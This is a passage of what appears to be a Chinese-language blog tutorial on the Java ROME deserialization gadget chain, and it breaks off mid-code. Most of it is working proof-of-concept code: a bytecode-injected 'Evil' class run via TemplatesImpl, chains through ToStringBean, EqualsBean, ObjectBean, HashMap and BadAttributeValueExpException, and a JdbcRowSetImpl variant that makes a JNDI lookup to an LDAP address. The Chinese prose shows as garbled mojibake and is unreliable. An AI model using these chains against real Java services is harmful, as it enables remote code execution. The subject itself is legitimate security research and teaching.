class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>    field.setAccessible(<span class="hljs-literal">true</span>);<br>    field.set(obj, newValue);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>    setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(TemplatesImpl.class, obj);<br>    System.out.println(bean);  <span class="hljs-comment">// è°ƒç”¨ToStringBeançš„toStringæ–¹æ³•</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€è¦æ‰¾æŸä¸ªç±»çš„<code>readObject</code>è°ƒç”¨äº†<code>toString</code>ä¸”è°ƒç”¨è€…å¯æ§ã€‚</p><p>è¿™é‡Œæ‰¾äº†ä¸ªä¸­é—´äºº<code>EqualsBean</code>ï¼Œå’Œ<code>ToStringBean</code>åœ¨åŒä¸€ä¸ªåŒ…ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EqualsBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">// The hashcode is calculated by getting the hashcode of the Bean String representation</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EqualsBean</span><span class="hljs-params">(Class beanClass,Object obj)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!beanClass.isInstance(obj)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(obj.getClass()+<span class="hljs-string">&quot; is not instance of &quot;</span> + beanClass);<br>        &#125;<br>        _beanClass = beanClass;<br>        _obj = obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> beanHashCode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">beanHashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> _obj.toString().hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç†Ÿæ‚‰çš„<code>hashCode</code>ï¼Œå…¥å£å°±æ˜¯<code>URLDNS</code>çš„å…¥å£ç±»<code>hashMap</code></p><p><code>hashMap#readObject</code> &#x3D;&gt; <code>hash(key)</code> &#x3D;&gt; <code>key.hashCode()</code> &#x3D;&gt; <code>EqualsBean#hashCode</code></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>å’Œ<code>URLDNS</code>ä¸€æ ·ï¼Œå¾€<code>map</code>é‡Œ<code>put</code>æ—¶ä¼šè§¦å‘<code>hashCode</code>ï¼Œè¿™é‡Œä½¿ç”¨<code>ObjectBean</code>æ¥ä½œä¸­è½¬ï¼Œåé¢å†ç”¨åå°„ä¿®æ”¹:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectBean</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ObjectBean</span><span class="hljs-params">(Class beanClass,Object obj,Set ignoreProperties)</span> &#123;<br>        _equalsBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(beanClass,obj);<br>        _toStringBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(beanClass,obj);<br>        _cloneableBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CloneableBean</span>(obj,ignoreProperties);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> _equalsBean.beanHashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, obj);<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, bean);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">fakeBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;p4d0rn&quot;</span>);  <span class="hljs-comment">// ä¼ å…¥æ— å®³çš„String.class</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(fakeBean, <span class="hljs-number">1</span>);  <span class="hljs-comment">// æ³¨æ„putçš„æ—¶å€™ä¹Ÿä¼šæ‰§è¡Œhash</span><br>        setFieldValue(fakeBean, <span class="hljs-string">&quot;_equalsBean&quot;</span>, equalsBean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(map);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ã€‚</p><p>æ„é€ <code>ToStringBean</code>æ—¶åº”è¯¥ä¼ å…¥<code>Templates.class</code>ï¼Œè¿™ä¸ª<code>Templates</code>æ¥å£åªå®šä¹‰äº†<code>getOutputProperties</code>è¿™ä¸ªæ–¹æ³•ã€‚</p><p>è‹¥ä¼ å…¥<code>TemplatesImpl.class</code>ï¼Œ<code>BeanIntrospector.getPropertyDescriptors(Target.class)</code>éå†getteræ–¹æ³•æ—¶ï¼Œä¼šå…ˆéå†åˆ°<code>getStylesheetDOM</code>ï¼Œ<code>return (DOM)_sdom.get();</code>ã€‚</p><p>è€Œ<code>_sdom</code>è¿™ä¸ªå±æ€§è¢«<code>transient</code>ä¿®é¥°ï¼Œæ— æ³•è¢«åºåˆ—åŒ–ã€‚ååºåˆ—åŒ–çš„æ—¶å€™ä¼šæŠ›å‡º<code>NullPoint</code>å¼‚å¸¸ï¼Œé€€å‡º<code>getter</code>æ–¹æ³•éå†ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œåˆ°<code>getOutputProperties</code></p></blockquote><p>CC5ä¸­ä¹Ÿæœ‰åˆ©ç”¨åˆ°<code>toString()</code>çš„ç±»ï¼Œ<code>BadAttributeValueExpException</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BadAttributeValueExpException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Exception</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> &#123;<br>        <span class="hljs-built_in">this</span>.val = val == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : val.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>            val = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/10/Rome/image-20240810223842547.png" alt="image-20240810223842547"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, obj);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(bean);<br>        <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>fastjsoné‚£èŠ‚åˆ©ç”¨çš„æ˜¯<code>JdbcRowSetImpl#setAutoCommit</code>æ¥è¿›è¡Œjndiæ³¨å…¥ï¼Œä½†ROMEé“¾æ˜¯è§¦å‘getteræ–¹æ³•ã€‚</p><p>å®é™…ä¸Šåœ¨<code>JdbcRowSetImpl</code>ç±»é‡Œæœç´¢<code>this.connect()</code>ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªæ–¹æ³•<code>getDatabaseMetaData</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> DatabaseMetaData <span class="hljs-title function_">getDatabaseMetaData</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.connect();<br>    <span class="hljs-keyword">return</span> var1.getMetaData();<br>&#125;<br><span class="hljs-keyword">private</span> Connection <span class="hljs-title function_">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.conn;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getDataSourceName() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">InitialContext</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>                <span class="hljs-type">DataSource</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> (DataSource)var1.lookup(<span class="hljs-built_in">this</span>.getDataSourceName());<br>            &#125;<br>            <span class="hljs-comment">// ....</span><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getDataSourceName</code>æ˜¯åœ¨<code>JdbcRowSetImpl</code>çˆ¶ç±»<code>BaseRowSet</code>ä¸­å®šä¹‰çš„ï¼Œæˆ‘ä»¬å°±ä¸èƒ½ç”¨<code>getDeclaredField</code>æ¥è·å–äº†ã€‚</p><p><code>JdbcRowSetImpl#setDataSourceName</code>å¯ä»¥ç›´æ¥è®¾ç½®å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;ldap://127.0.0.1:8099/aaa&quot;</span>);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        setFieldValue(badAttributeValueExpException, <span class="hljs-string">&quot;val&quot;</span>, bean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 